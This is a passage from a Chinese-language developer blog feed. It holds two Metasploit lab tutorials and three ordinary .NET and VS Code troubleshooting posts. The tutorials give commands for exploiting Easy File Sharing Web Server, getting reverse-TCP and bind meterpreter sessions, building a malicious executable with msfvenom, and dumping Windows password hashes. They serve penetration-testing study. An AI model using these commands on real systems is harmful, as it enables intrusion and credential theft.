class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ps</span><br><span class="line">getpid</span><br><span class="line">hashdump</span><br><span class="line">migrate [x64的processid]</span><br><span class="line">hashdump</span><br></pre></td></tr></table></figure></p><img src="/2022/08/31/metasploit-privilege-escalation/11.png" title="haspdump"> <p>註:如果 process 的 Arch 不同 OS 在執行 hashdump 時，會有 <strong>priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.</strong> 的錯誤。所以可以透過 <code>migrate [pid]</code> 來使用適合 Arch 的 Process，再執行 <code>hashdump</code></p><blockquote><p>註:以上有漏洞的軟體，測試後，請記得將它移除哦 ^_^</p></blockquote><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://pentestwiki.org/privilege-escalation-in-windows-and-linux/" target="_blank" rel="noopener">Windows Privilege Escalation Methods</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;成功透過 Metasploit 建立 meterpreter session 時，可以透過 &lt;code&gt;hashdump&lt;/code&gt; 將 
      
    
    </summary>
    
    
      <category term="metasploit" scheme="https://rainmakerho.github.io/tags/metasploit/"/>
    
      <category term="meterpreter" scheme="https://rainmakerho.github.io/tags/meterpreter/"/>
    
      <category term="privilege escalation" scheme="https://rainmakerho.github.io/tags/privilege-escalation/"/>
    
  </entry>
  
  <entry>
    <title>建立 Metasploit meterpreter session</title>
    <link href="https://rainmakerho.github.io/2022/08/31/metasploit-meterpreter-session/"/>
    <id>https://rainmakerho.github.io/2022/08/31/metasploit-meterpreter-session/</id>
    <published>2022-08-31T06:44:49.000Z</published>
    <updated>2022-09-01T02:14:43.231Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>以上介紹 2種建立 metasploit meterpreter session 的方式，<br>1.利用 Server 對外漏洞<br>2.建立惡意的檔案讓受害者去執行</p><p>使用工具有， <a href="https://nmap.org/" target="_blank" rel="noopener">nmap</a> 及 <a href="https://www.metasploit.com/" target="_blank" rel="noopener">Metasploit Framework</a></p><h3 id="利用-Easy-File-Sharing-Web-Server-7-2-漏洞"><a href="#利用-Easy-File-Sharing-Web-Server-7-2-漏洞" class="headerlink" title="利用 Easy File Sharing Web Server 7.2 漏洞"></a>利用 Easy File Sharing Web Server 7.2 漏洞</h3><p>1.到 <a href="https://www.exploit-db.com/exploits/42256" target="_blank" rel="noopener">Easy File Sharing HTTP Server 7.2 - POST Buffer Overflow (Metasploit)</a> 下載有漏洞的軟體，並安裝在受害的電腦(10.5.0.13)上面，然後執行起來，http port 設定為 8080 ，可以點選「Go」Button，試一下網頁是否可以正常運作。</p><img src="/2022/08/31/metasploit-meterpreter-session/01.png" title="Easy File Sharing HTTP Server 7.2 - POST Buffer Overflow (Metasploit)"><img src="/2022/08/31/metasploit-meterpreter-session/02.png" title="Easy File Sharing HTTP Server 7.2"><p>註:因為試用版本，所以運作時間只有 30分鐘哦!</p><p>2.在攻擊者電腦中，用 <code>nmap -sV 10.5.0.13</code> 掃看看受害電腦有什麼服務<br><img src="/2022/08/31/metasploit-meterpreter-session/03.png" title="nmap -sV"></p><p>3.發現受害電腦有一個 <strong>8080/tcp Easy File Sharing Web Server httpd 6.9</strong> 的對外服務，剛好它是一個有漏洞的服務，所以開啟 <code>msfconsole</code> 來 Search 看看有沒有針對這個服務攻擊的模組<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search easy file sharing</span><br></pre></td></tr></table></figure></p><img src="/2022/08/31/metasploit-meterpreter-session/04.png" title="msfconsole search"><p>4.使用 <strong>Buffer Overflow</strong> 這個模組，並設定相關的參數後，進行攻擊<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/http/easyfilesharing_post</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> payload windows/shell/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> RHOSTS 10.5.0.13</span><br><span class="line"><span class="built_in">set</span> RPORT 8080</span><br><span class="line"><span class="built_in">set</span> LHOST 10.5.0.7</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><p>5.因為 payload 是使用 <strong>windows/shell/reverse_tcp</strong> ，所以攻擊成功後，會直接進入受害者的 OS Shell ，如果要離開就按 Ctrl + C ，暫時離開可輸入 <code>background</code><br><img src="/2022/08/31/metasploit-meterpreter-session/05.png" title="reverse_tcp shell"></p><p>6.可以將 payload 改為 <strong>windows/meterpreter/reverse_tcp</strong>，再執行 <code>run</code> ，就會進入到 meterpreter session<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LPORT 4443</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><img src="/2022/08/31/metasploit-meterpreter-session/06.png" title="meterpreter reverse_tcp"><h3 id="利用-惡意執行檔"><a href="#利用-惡意執行檔" class="headerlink" title="利用 惡意執行檔"></a>利用 惡意執行檔</h3><p>1.透過 <strong>msfvenom</strong> 來建立惡意的執行檔<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter_bind_tcp LPORT=443 -f exe -o bind.exe</span><br></pre></td></tr></table></figure></p><p>產生惡意執行檔 bind.exe，執行時會開放 443 Port 來讓我們連接</p><p>2.透過 python 來建立 http Server 來讓受害電腦來下載<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure></p><p>3.登入受害電腦，下載 並執行 bind.exe<br><img src="/2022/08/31/metasploit-meterpreter-session/07.png" title="Run Bind.exe"></p><p>4.開啟 Command 視窗，執行 <code>netstat -an | findstr 443</code>，可以發現開啟 443 在 Listening，等待送入 meterpreter_bind_tcp 的 payload 來建立 meterpreter session<br><img src="/2022/08/31/metasploit-meterpreter-session/08.png" title="netstat"></p><p>5.進入 <code>msfconsole</code>，使用 <strong>multi/handler</strong>，並使用 <strong>windows/meterpreter_bind_tcp</strong> payload ，及設定受害電腦(RHOST)及 LPORT 為 443<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use multi/handler</span><br><span class="line">set payload windows/meterpreter_bind_tcp</span><br><span class="line">set RHOST 10.5.0.14</span><br><span class="line">set LPORT 443</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><img src="/2022/08/31/metasploit-meterpreter-session/09.png" title="meterpreter_bind_tcp"><h3 id="Meterpreter-session-的操作"><a href="#Meterpreter-session-的操作" class="headerlink" title="Meterpreter session 的操作"></a>Meterpreter session 的操作</h3><p>1.當要暫時離開session，可輸入 <code>background</code> or <code>bg</code><br>2.查看當前 sessions ，請輸入 <code>sessions</code><br>3.進入某個 session，請輸入 <code>sessions [session-id]</code><br>4.上傳檔案可使用 <code>upload /home/[攻擊者帳號]/bind.exe</code><br>5.下載檔案可使用 <code>download [victim file] /home/[攻擊者帳號]</code></p><blockquote><p>註:以上有漏洞的軟體，測試後，請記得將它移除哦 ^_^</p></blockquote><h3 id="參考資訊"><a href="#參考資訊" class="headerlink" title="參考資訊"></a>參考資訊</h3><p><a href="https://docs.rapid7.com/metasploit/manage-meterpreter-and-shell-sessions/" target="_blank" rel="noopener">Manage Meterpreter and Shell Sessions</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;以上介紹 2種建立 metasploit meterpreter session 的方式，&lt;br&gt;1.利用 Server 對外漏洞&lt;br&gt;2
      
    
    </summary>
    
    
      <category term="metasploit" scheme="https://rainmakerho.github.io/tags/metasploit/"/>
    
      <category term="meterpreter" scheme="https://rainmakerho.github.io/tags/meterpreter/"/>
    
      <category term="Easy File Sharing Web Server" scheme="https://rainmakerho.github.io/tags/Easy-File-Sharing-Web-Server/"/>
    
      <category term="nmap" scheme="https://rainmakerho.github.io/tags/nmap/"/>
    
  </entry>
  
  <entry>
    <title>Timeout expired. all pooled connections were in use and max pool size was reached. 自動關閉 Connection ?</title>
    <link href="https://rainmakerho.github.io/2022/08/29/timeout-expired-max-pool-size-reached/"/>
    <id>https://rainmakerho.github.io/2022/08/29/timeout-expired-max-pool-size-reached/</id>
    <published>2022-08-29T03:27:36.000Z</published>
    <updated>2022-08-29T06:36:21.799Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>我們有一個 ASP.NET Core 的系統，跑一跑就會有 <strong>System.InvalidOperationException: Timeout expired.  The timeout period elapsed prior to obtaining a connection from the pool.  This may have occurred because all pooled connections were in use and max pool size was reached.</strong> 的錯誤。但是它的 Max Pool Size 已經設定到了 6,000 ，還是會噴錯。<br>那系統中一定有沒有關掉的 Connection 才會如此 …</p><h3 id="問題"><a href="#問題" class="headerlink" title="問題"></a>問題</h3><p>針對連線到 DB 存取的 Method 來查看，發現有一個 <a href="https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqlcommand.executereaderasync" target="_blank" rel="noopener">SqlCommand.ExecuteReaderAsync</a> ，它的寫法大致如下，<br><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task&lt;DataTable&gt; <span class="title">getDT</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DataTable dt = <span class="keyword">new</span> DataTable();</span><br><span class="line">    <span class="keyword">var</span> reader = <span class="keyword">await</span> getReader();</span><br><span class="line">    dt.Load(reader);</span><br><span class="line">    reader.Close();</span><br><span class="line">    <span class="keyword">return</span> dt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task&lt;IDataReader&gt; <span class="title">getReader</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> connString = <span class="string">@"Data Source=(LocalDB)\MSSQLLocalDB;Initial Catalog=BookStore;Integrated Security=True;Max Pool Size=4;Application Name=&#123;0&#125;"</span>;</span><br><span class="line">    connString = String.Format(connString, <span class="string">"ap-Reader"</span>);</span><br><span class="line">    <span class="keyword">var</span> cn = <span class="keyword">new</span> SqlConnection(connString);</span><br><span class="line">    cn.Open();</span><br><span class="line">    <span class="keyword">var</span> cmd = <span class="keyword">new</span> SqlCommand(<span class="string">@"select * from [dbo].[AbpRoles]"</span>, cn);</span><br><span class="line">    <span class="keyword">var</span> reader = <span class="keyword">await</span> cmd.ExecuteReaderAsync();</span><br><span class="line">    <span class="keyword">return</span> reader;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> xi = <span class="number">0</span>; xi &lt; <span class="number">10</span>; xi++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> dt1 = <span class="keyword">await</span> getDT();</span><br><span class="line">    <span class="keyword">var</span> v = <span class="keyword">await</span> getScalarValue();</span><br><span class="line">    Console.WriteLine(<span class="string">$"<span class="subst">&#123;xi&#125;</span>"</span>);</span><br><span class="line">&#125;</span><br><span class="line">Console.ReadKey();</span><br></pre></td></tr></table></figure></p><p>主要是透過 IDataReader 來將資料放入 DataTable 之中，但是因為這樣子的做法，<br>DB 的 Connection 就要等到取得 DataTable 後才可以 Close 。<br>可是，DB Connection 都離開了 Function 範圍還不會 Close 嗎?<br>是的，像上面的程式碼，設定 Max Pool Size 為<strong>4</strong>個，<br>所以迴圈跑到第5個時，就會發生錯誤了，因為 Pool 中的 Connection 被已被佔滿了。<br><img src="/2022/08/29/timeout-expired-max-pool-size-reached/01.png" title="max pool size was reached"></p><ul><li>註: 在 Connection String 中加入 <strong>Application Name={0}</strong>，然後再透過 <code>connString = String.Format(connString, &quot;ap-Reader&quot;)</code> 來置換 Application Name ，是為了在 DB 中更容易查詢到，那裡的程式有造成 Connection 沒有 Close 。</li><li>註: 不同的 Connection String 會有個別的 Connection Pool ，所以當 Application Name 不同時，就會有不同的 Pool 哦~</li></ul><p>可以透過以下的 SQL Script 來查看連線的狀況，<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ConnectionStatus = <span class="keyword">CASE</span> <span class="keyword">WHEN</span> dec.most_recent_sql_handle = <span class="number">0x0</span></span><br><span class="line">        <span class="keyword">THEN</span> <span class="string">'Unused'</span></span><br><span class="line">        <span class="keyword">ELSE</span> <span class="string">'Used'</span></span><br><span class="line">        <span class="keyword">END</span></span><br><span class="line">    , <span class="keyword">CASE</span> <span class="keyword">WHEN</span> des.status = <span class="string">'Sleeping'</span></span><br><span class="line">        <span class="keyword">THEN</span> <span class="string">'sleeping'</span></span><br><span class="line">        <span class="keyword">ELSE</span> <span class="string">'Not Sleeping'</span></span><br><span class="line">        <span class="keyword">END</span></span><br><span class="line">    , ConnectionCount = <span class="keyword">COUNT</span>(<span class="number">1</span>)</span><br><span class="line">, des.program_name</span><br><span class="line">    , des.login_name</span><br><span class="line"><span class="keyword">FROM</span> sys.dm_exec_connections <span class="built_in">dec</span></span><br><span class="line">    <span class="keyword">INNER</span> <span class="keyword">JOIN</span> sys.dm_exec_sessions des</span><br><span class="line">        <span class="keyword">ON</span> dec.session_id = des.session_id</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> des.status = <span class="string">'Sleeping'</span></span><br><span class="line">        <span class="keyword">THEN</span> <span class="string">'sleeping'</span></span><br><span class="line">        <span class="keyword">ELSE</span> <span class="string">'Not Sleeping'</span></span><br><span class="line">        <span class="keyword">END</span></span><br><span class="line">    , <span class="keyword">CASE</span> <span class="keyword">WHEN</span> dec.most_recent_sql_handle = <span class="number">0x0</span></span><br><span class="line">        <span class="keyword">THEN</span> <span class="string">'Unused'</span></span><br><span class="line">        <span class="keyword">ELSE</span> <span class="string">'Used'</span></span><br><span class="line">        <span class="keyword">END</span></span><br><span class="line">    , des.login_name</span><br><span class="line">,des.program_name</span><br></pre></td></tr></table></figure></p><img src="/2022/08/29/timeout-expired-max-pool-size-reached/02.png" title="Connection Status"><p>知道是因為 ExecuteReader /ExecuteReaderAsync 造成 Connection 無法被回收到 Pool 中，<br>就要來想看看如何將 Connection 關掉。<br>有想到在傳回 DataReader 時，一併將 Connection 也傳回去，或是改用 DataAdapter ，<br>但是因為該 Method 已被一堆程式碼參考使用，如果動程式，相對要調整的地方也很多 …QQ<br>後來發現 ExecuteReader /ExecuteReaderAsync 可接受一個 <a href="https://docs.microsoft.com/en-us/dotnet/api/system.data.commandbehavior" target="_blank" rel="noopener">CommandBehavior</a> 的參數，其中有一個 CloseConnection 的選項可以使用。</p><blockquote><p>CloseConnection : When the command is executed, the associated Connection object is closed when the associated DataReader object is closed.</p></blockquote><p>當相關的 DataReader 關閉時，Connection 也會關閉。</p><p>所以原本的 cmd.ExecuteReaderAsync() 就多加入 <strong>CommandBehavior.CloseConnection</strong> 參數，當用完 DataReader 後，Connection 也會 Close 了。<br><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">async</span> Task&lt;IDataReader&gt; <span class="title">getReader</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> connString = <span class="string">@"Data Source=(LocalDB)\MSSQLLocalDB;Initial Catalog=BookStore;Integrated Security=True;Max Pool Size=4;Application Name=&#123;0&#125;"</span>;</span><br><span class="line">    connString = String.Format(connString, <span class="string">"ap-Reader"</span>);</span><br><span class="line">    <span class="keyword">var</span> cn = <span class="keyword">new</span> SqlConnection(connString);</span><br><span class="line">    cn.Open();</span><br><span class="line">    <span class="keyword">var</span> cmd = <span class="keyword">new</span> SqlCommand(<span class="string">@"select * from [dbo].[AbpRoles]"</span>, cn);</span><br><span class="line">    <span class="comment">//多加入 CommandBehavior.CloseConnection 參數，當 reader close 後，Connection 也會跟著被關閉</span></span><br><span class="line">    <span class="keyword">var</span> reader = <span class="keyword">await</span> cmd.ExecuteReaderAsync(CommandBehavior.CloseConnection);</span><br><span class="line">    <span class="keyword">return</span> reader;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqlcommand.executereaderasync" target="_blank" rel="noopener">SqlCommand.ExecuteReaderAsync</a><br><a href="https://docs.microsoft.com/en-us/dotnet/api/system.data.sqlclient.sqlcommand.executereader" target="_blank" rel="noopener">SqlCommand.ExecuteReader</a><br><a href="https://dotblogs.azurewebsites.net/rainmaker/2017/04/26/143316" target="_blank" rel="noopener">已超過連接逾時的設定。在取得集區連接之前超過逾時等待的時間，可能的原因為所有的共用連接已在使用中，並已達共用集區大小的最大值。</a><br><a href="https://stackoverflow.com/questions/10519273/will-executereadercommandbehavior-closeconnection-always-close-connection" target="_blank" rel="noopener">Will ExecuteReader(CommandBehavior.CloseConnection) always close connection?</a><br><a href="https://docs.microsoft.com/en-us/dotnet/api/system.data.commandbehavior" target="_blank" rel="noopener">CommandBehavior</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;我們有一個 ASP.NET Core 的系統，跑一跑就會有 &lt;strong&gt;System.InvalidOperationException
      
    
    </summary>
    
    
      <category term="Timeout" scheme="https://rainmakerho.github.io/tags/Timeout/"/>
    
      <category term="Connection Pooling" scheme="https://rainmakerho.github.io/tags/Connection-Pooling/"/>
    
      <category term="Auto Close" scheme="https://rainmakerho.github.io/tags/Auto-Close/"/>
    
      <category term="Connection" scheme="https://rainmakerho.github.io/tags/Connection/"/>
    
      <category term="Pool" scheme="https://rainmakerho.github.io/tags/Pool/"/>
    
      <category term="ExecuteReader" scheme="https://rainmakerho.github.io/tags/ExecuteReader/"/>
    
      <category term="ExecuteReaderAsync" scheme="https://rainmakerho.github.io/tags/ExecuteReaderAsync/"/>
    
      <category term="CloseConnection" scheme="https://rainmakerho.github.io/tags/CloseConnection/"/>
    
  </entry>
  
  <entry>
    <title>使用 VS Code Debug 時，Console.ReadLine() 沒作用</title>
    <link href="https://rainmakerho.github.io/2022/08/04/vscode-debug-console-readline-not-work/"/>
    <id>https://rainmakerho.github.io/2022/08/04/vscode-debug-console-readline-not-work/</id>
    <published>2022-08-04T01:10:31.000Z</published>
    <updated>2022-08-04T01:26:35.301Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>透過 VS Code 偵錯時，程式到了 <code>var input=Console.ReadLine();</code>後，<br>會在 <strong>偵錯主控台</strong> 接受使用者的輸入，<br>但輸入值按下 Enter 鍵後，卻沒有作用 </p><h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>查到 <a href="https://stackoverflow.com/questions/41195432/debug-console-window-cannot-accept-console-readline-input-during-debugging" target="_blank" rel="noopener">Debug Console window cannot accept Console.ReadLine() input during debugging</a>，<br>因為 <strong>launch.json</strong> 中 <strong>configurations-&gt;console</strong> 的 <strong>internalConsole</strong> 不 Support Console.ReadLine() 。<br><img src="/2022/08/04/vscode-debug-console-readline-not-work/01.png" title="internalConsole"></p><p>所以要將它改成 <strong>externalTerminal</strong> 或是 <strong>integratedTerminal</strong> 才可以。</p><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://stackoverflow.com/questions/41195432/debug-console-window-cannot-accept-console-readline-input-during-debugging" target="_blank" rel="noopener">Debug Console window cannot accept Console.ReadLine() input during debugging</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;透過 VS Code 偵錯時，程式到了 &lt;code&gt;var input=Console.ReadLine();&lt;/code&gt;後，&lt;br&gt;會在
      
    
    </summary>
    
    
      <category term="VSCode" scheme="https://rainmakerho.github.io/tags/VSCode/"/>
    
      <category term="Console.ReadLine" scheme="https://rainmakerho.github.io/tags/Console-ReadLine/"/>
    
      <category term="internalConsole" scheme="https://rainmakerho.github.io/tags/internalConsole/"/>
    
      <category term="偵錯主控台" scheme="https://rainmakerho.github.io/tags/%E5%81%B5%E9%8C%AF%E4%B8%BB%E6%8E%A7%E5%8F%B0/"/>
    
  </entry>
  
  <entry>
    <title>ASP.NET MVC 使用 Microsoft.Owin.Security 驗證 Azure AD，並傳送自定參數</title>
    <link href="https://rainmakerho.github.io/2022/07/29/mvc5-owin-azure-ad-openid/"/>
    <id>https://rainmakerho.github.io/2022/07/29/mvc5-owin-azure-ad-openid/</id>
    <published>2022-07-29T06:49:21.000Z</published>
    <updated>2022-07-29T07:12:22.802Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>同事在練習 <a href="https://docs.microsoft.com/zh-tw/learn/modules/msgraph-build-aspnetmvc-apps/5-exercise-add-auth" target="_blank" rel="noopener">將 Microsoft 驗證程式庫納入 ASP.NET MVC Web 應用程式</a> 時，想要在 <strong>AccountController</strong> 的 <strong>SignIn()</strong> 中，在轉址到 Azure AD 驗證登入前先存入某些參數，然後在 Azure AD 驗證登入成功後，取回該參數。</p><h3 id="準備環境"><a href="#準備環境" class="headerlink" title="準備環境"></a>準備環境</h3><p>透過 Visual Studio 新增 ASP.NET MVC 專案，並加入以下的 Nuget 套件，</p><ul><li>Microsoft.Owin</li><li>Microsoft.Owin.Host.SystemWeb</li><li>Microsoft.Owin.Security</li><li>Microsoft.Owin.Security.Cookies</li><li>Microsoft.Owin.Security.OpenIdConnect</li><li>Microsoft.Graph</li></ul><h3 id="測試"><a href="#測試" class="headerlink" title="測試"></a>測試</h3><p>要額外傳送參數，可以透過 <strong>AuthenticationProperties</strong> 的 Dictionary 來加入額外的參數。<br>所以在 <strong>AccountController</strong> 的 <strong>SignIn()</strong> 中，可以加入一個 tuid 的參數，如下，<br><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SignIn</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// Signal OWIN to send an authorization request to Azure</span></span><br><span class="line">    <span class="keyword">var</span> authProps = <span class="keyword">new</span> AuthenticationProperties</span><br><span class="line">    &#123;</span><br><span class="line">        RedirectUri = <span class="string">"/"</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//加入額外要傳遞的參數到 Dictionary 之中</span></span><br><span class="line">    <span class="keyword">var</span> guid = Guid.NewGuid().ToString();</span><br><span class="line">    authProps.Dictionary.Add(<span class="string">"tuid"</span>, guid);</span><br><span class="line"></span><br><span class="line">    Request.GetOwinContext().Authentication.Challenge(</span><br><span class="line">            authProps,</span><br><span class="line">            OpenIdConnectAuthenticationDefaults.AuthenticationType);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><img src="/2022/07/29/mvc5-owin-azure-ad-openid/01.png" title="Dictionary.Add"><p>Azure AD 登入驗證完成後，會進入到 <strong>OnAuthorizationCodeReceivedAsync</strong> Method 之中，<br>就可以透過參數 <strong>notification</strong> 中的 <strong>AuthenticationTicket.Properties.Dictionary</strong> 取出參數值，如下，<br><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">async</span> Task <span class="title">OnAuthorizationCodeReceivedAsync</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">            AuthorizationCodeReceivedNotification notification</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> tuid = <span class="keyword">string</span>.Empty;</span><br><span class="line">    <span class="keyword">if</span>(notification.AuthenticationTicket</span><br><span class="line">        .Properties.Dictionary.TryGetValue(<span class="string">"tuid"</span>, <span class="keyword">out</span> tuid))&#123;</span><br><span class="line">        <span class="comment">//正確取回 tuid 的值 ...</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> idClient = ConfidentialClientApplicationBuilder.Create(appId)</span><br><span class="line">        .WithRedirectUri(redirectUri)</span><br><span class="line">        .WithClientSecret(appSecret)</span><br><span class="line">        .Build();</span><br><span class="line">    <span class="comment">// ... 原範例程式碼</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><img src="/2022/07/29/mvc5-owin-azure-ad-openid/02.png" title="Dictionary.TryGetValue"><h3 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h3><p><a href="https://docs.microsoft.com/zh-tw/learn/modules/msgraph-build-aspnetmvc-apps/5-exercise-add-auth" target="_blank" rel="noopener">將 Microsoft 驗證程式庫納入 ASP.NET MVC Web 應用程式</a><br><a href="https://hajekj.net/2018/06/12/passing-state-through-authentication-in-asp-net-core/" target="_blank" rel="noopener">Passing state through authentication in ASP.NET Core</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;同事在練習 &lt;a href=&quot;https://docs.microsoft.com/zh-tw/learn/modules/msgraph-
      
    
    </summary>
    
    
      <category term="ASP.NET MVC" scheme="https://rainmakerho.github.io/tags/ASP-NET-MVC/"/>
    
      <category term="Azure AD" scheme="https://rainmakerho.github.io/tags/Azure-AD/"/>
    
      <category term="Owin.Security" scheme="https://rainmakerho.github.io/tags/Owin-Security/"/>
    
      <category term="Owin.Security.OpenIdConnect" scheme="https://rainmakerho.github.io/tags/Owin-Security-OpenIdConnect/"/>
    
      <category term="AuthenticationProperties" scheme="https://rainmakerho.github.io/tags/AuthenticationProperties/"/>
    
      <category term="AuthorizationCodeReceivedNotification" scheme="https://rainmakerho.github.io/tags/AuthorizationCodeReceivedNotification/"/>
    
  </entry>
  
  <entry>
    <title>用戶端和伺服器無法溝通，因為它們沒有公用的演算法</title>
    <link href="https://rainmakerho.github.io/2022/07/12/tls-do-not-a-common-algorithm/"/>
